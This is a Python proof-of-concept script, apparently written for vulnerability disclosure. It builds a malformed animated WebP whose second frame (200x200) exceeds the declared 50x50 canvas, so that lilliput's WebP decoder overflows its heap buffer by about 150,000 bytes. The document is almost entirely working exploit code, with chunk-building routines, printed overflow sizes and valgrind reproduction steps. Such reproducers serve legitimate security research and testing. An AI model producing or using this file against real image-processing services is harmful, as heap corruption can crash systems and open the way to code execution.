#!/usr/bin/env python3
"""
Reproducer: WebP decode buffer overflow in lilliput webp.cpp

Creates a WebP animation where:
  - Canvas size: 50x50 (small)
  - Frame 2 size: 200x200 (4x larger than canvas)

The decode_buffer is allocated for canvas size (50*50*4 = 10,000 bytes),
but WebPDecodeBGRAInto writes frame_w * frame_h * 4 = 160,000 bytes,
causing a heap buffer overflow of ~150,000 bytes.

Requirements:
    pip install Pillow

Usage:
    python3 craft_webp_overflow.py poc_webp.webp
"""

import sys
import struct
import io

try:
    from PIL import Image
    HAS_PILLOW = True
except ImportError:
    HAS_PILLOW = False


def make_solid_webp_frame(width, height, color=(255, 0, 0, 255)):
    """Create a solid-color WebP image of given dimensions."""
    if not HAS_PILLOW:
        raise ImportError("Pillow required: pip install Pillow")
    img = Image.new('RGBA', (width, height), color)
    buf = io.BytesIO()
    img.save(buf, format='WEBP', lossless=True)
    return buf.getvalue()


def uint32le(v):
    return struct.pack('<I', v & 0xFFFFFFFF)


def uint24le(v):
    return struct.pack('<I', v & 0xFFFFFF)[:3]


def make_webp_anim(canvas_w, canvas_h, frames):
    """
    Manually construct a WebP animation (RIFF container with ANIM/ANMF chunks).
    
    frames: list of (frame_data_bytes, x_offset, y_offset, duration_ms)
    
    The frame data can have dimensions different from the canvas.
    """
    
    def riff_chunk(tag, data):
        if len(data) % 2 == 1:
            data += b'\x00'  # Pad to even
        return tag.encode() + uint32le(len(data)) + data
    
    # VP8X chunk: marks this as extended WebP with animation
    # Flags: ANIMATION=0x02, ALPHA=0x10
    vp8x_flags = 0x02  # animation flag
    vp8x_data = struct.pack('<B', vp8x_flags) + b'\x00\x00\x00'  # flags + reserved
    vp8x_data += uint24le(canvas_w - 1)  # canvas width minus 1
    vp8x_data += uint24le(canvas_h - 1)  # canvas height minus 1
    vp8x_chunk = riff_chunk('VP8X', vp8x_data)
    
    # ANIM chunk: animation parameters
    # bgcolor (BGRA), loop_count
    anim_data = struct.pack('<I', 0xFFFFFFFF)  # bgcolor: white, opaque
    anim_data += struct.pack('<H', 0)           # loop_count: 0 = infinite
    anim_chunk = riff_chunk('ANIM', anim_data)
    
    # ANMF chunks: individual animation frames
    anmf_chunks = b''
    for (frame_data, x_off, y_off, duration) in frames:
        # Frame Origin (X, Y): 24-bit each, divided by 2
        # Frame width/height embedded in the VP8/VP8L frame data
        anmf_data = uint24le(x_off // 2)   # X offset / 2
        anmf_data += uint24le(y_off // 2)  # Y offset / 2
        
        # We need frame width/height from the VP8/VP8L data itself
        # but ANMF also stores it; parse from actual webp data
        # For simplicity, extract from the VP8L/VP8 chunk inside frame_data
        fw, fh = get_webp_dimensions(frame_data)
        anmf_data += uint24le(fw - 1)        # Frame width - 1
        anmf_data += uint24le(fh - 1)        # Frame height - 1
        anmf_data += uint24le(duration)      # Duration (ms), 24-bit
        anmf_data += bytes([0b00000010])     # Flags: blending=1 (no blend), disposal=0
        
        # Append the actual frame bitstream (VP8 or VP8L data, without RIFF wrapper)
        frame_payload = extract_frame_payload(frame_data)
        anmf_data += frame_payload
        
        anmf_chunks += riff_chunk('ANMF', anmf_data)
    
    # Assemble WEBP payload
    webp_payload = b'WEBP' + vp8x_chunk + anim_chunk + anmf_chunks
    
    # RIFF wrapper
    riff = b'RIFF' + uint32le(len(webp_payload)) + webp_payload
    return riff


def get_webp_dimensions(webp_bytes):
    """Extract width/height from a simple (non-animated) WebP file."""
    if not HAS_PILLOW:
        # Fallback: parse VP8L manually
        # VP8L signature: 0x2F followed by width-1 (14 bits) and height-1 (14 bits)
        idx = webp_bytes.find(b'VP8L')
        if idx >= 0:
            data = webp_bytes[idx+8:]  # skip 'VP8L' + size + 0x2F
            bits = int.from_bytes(data[1:5], 'little')
            w = (bits & 0x3FFF) + 1
            h = ((bits >> 14) & 0x3FFF) + 1
            return w, h
        return 0, 0
    img = Image.open(io.BytesIO(webp_bytes))
    return img.size  # (width, height)


def extract_frame_payload(webp_bytes):
    """Extract the VP8/VP8L chunk from a standalone WebP file (strip RIFF wrapper)."""
    # Find VP8L or VP8 chunk
    for tag in [b'VP8L', b'VP8 ', b'VP8\x00']:
        idx = webp_bytes.find(tag)
        if idx >= 0:
            size = struct.unpack('<I', webp_bytes[idx+4:idx+8])[0]
            # Return the chunk including tag+size header
            end = idx + 8 + size
            if end % 2 == 1:
                end += 1
            return webp_bytes[idx:end]
    raise ValueError("Could not find VP8/VP8L chunk in WebP data")


def make_poc(output_file):
    if not HAS_PILLOW:
        print("[!] Pillow not available. Generating simplified test case.")
        print("[!] Install Pillow: pip install Pillow")
        # Generate a simple description file instead
        with open(output_file, 'w') as f:
            f.write("""
# WebP Overflow POC - Manual Construction Required

Without Pillow, we cannot generate valid WebP frames programmatically.

To create the POC manually:
1. Create frame1.png: 50x50 red image
2. Create frame2.png: 200x200 blue image  
3. Use img2webp tool:
   img2webp -d 100 frame1.png -d 200 frame2.png -o poc.webp

Then inspect the output: the canvas will be 50x50 but frame2 is 200x200.
When lilliput's webp_decoder_decode() processes frame2, it calls:
  WebPDecodeBGRAInto(data, size, d->decode_buffer, 50*50*4=10000, 200*4=800)
The required buffer is 200*200*4=160000 but only 10000 bytes available.

Alternatively, observe the bug via valgrind:
  valgrind --tool=memcheck ./lilliput-resize poc.webp output.png 100 100
""")
        return
    
    canvas_w, canvas_h = 50, 50
    frame1_w, frame1_h = 50, 50    # Same as canvas (safe)
    frame2_w, frame2_h = 200, 200  # LARGER than canvas (triggers overflow)
    
    print(f"[+] Canvas: {canvas_w}x{canvas_h}")
    print(f"[+] Frame 1: {frame1_w}x{frame1_h} (safe, same as canvas)")
    print(f"[+] Frame 2: {frame2_w}x{frame2_h} (triggers overflow!)")
    print(f"[+] decode_buffer allocated: {canvas_w*canvas_h*4} bytes")
    print(f"[+] decode_buffer needed for frame2: {frame2_w*frame2_h*4} bytes")
    print(f"[+] Overflow: {frame2_w*frame2_h*4 - canvas_w*canvas_h*4} bytes")
    
    frame1_webp = make_solid_webp_frame(frame1_w, frame1_h, (255, 0, 0, 255))
    frame2_webp = make_solid_webp_frame(frame2_w, frame2_h, (0, 0, 255, 255))
    
    frames = [
        (frame1_webp, 0, 0, 100),   # frame1 at (0,0), 100ms
        (frame2_webp, 0, 0, 100),   # frame2 at (0,0), 100ms - OVERFLOWS
    ]
    
    try:
        webp_data = make_webp_anim(canvas_w, canvas_h, frames)
        with open(output_file, 'wb') as f:
            f.write(webp_data)
        print(f"[+] Written {len(webp_data)} bytes to {output_file}")
    except Exception as e:
        print(f"[!] Error building WebP animation: {e}")
        print("[!] Fallback: saving as multi-frame WebP via Pillow")
        # Pillow fallback: save as animated WebP directly
        img1 = Image.new('RGBA', (frame1_w, frame1_h), (255, 0, 0, 255))
        img2 = Image.new('RGBA', (frame2_w, frame2_h), (0, 0, 255, 255))
        # Note: Pillow will normalize canvas to largest frame size in animated WebP
        # This still demonstrates the issue through frame size variation
        img1.save(output_file, format='WEBP', save_all=True,
                  append_images=[img2], duration=100, loop=0)
        print(f"[+] Written via Pillow fallback to {output_file}")


if __name__ == '__main__':
    output_file = sys.argv[1] if len(sys.argv) > 1 else 'poc_webp_overflow.webp'
    make_poc(output_file)
